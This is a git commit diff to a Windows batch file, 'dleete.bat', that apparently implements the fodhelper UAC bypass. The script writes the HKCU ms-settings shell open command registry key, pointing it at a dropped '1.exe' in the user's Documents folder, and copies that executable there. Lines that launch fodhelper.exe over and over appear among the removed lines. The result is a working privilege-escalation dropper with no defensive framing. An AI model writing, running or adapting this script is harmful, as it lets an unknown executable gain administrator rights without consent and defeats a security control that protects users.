d2899e3037920233795e3e04d26e3068f81a7689
AvloOnYt <baileyc0522@gmail.com>
2025-05-15 19:20:49 +0100

    Update dleete.bat

--- dleete.bat
+++ dleete.bat
@@ -9,30 +9,20 @@ echo Not Admin
 goto uac
 
 :uac
-set "filepath=%userprofile%\Documents\1"
+set "filepath3=%userprofile%\Documents\1"
+set "filepath=%userprofile%\Documents\1\12"
+set "filepath2=%userprofile%\Documents\1\12\1.exe"
 set "filepath12=%userprofile%\Documents\1\1.exe"
+
 if not exist "%filepath%" (
     mkdir "%filepath%"
 )
+if not exist "%filepath3%" (
+    mkdir "%filepath3%"
+)
 powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force"
 powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"
-powershell -Command "if (Test-Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command') { Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%filepath12%' } else { Write-Host 'Registry path does not exist.' }"
-xcopy "%userprofile%\Desktop\ghgh\1.exe" "%filepath%"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
-powershell -command "Start-Process 'fodhelper.exe'"
+powershell -Command "if (Test-Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command') { Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%filepath2%' } else { Write-Host 'Registry path does not exist.' }"
+xcopy "%filepath12%" "%filepath%"
 exit
 
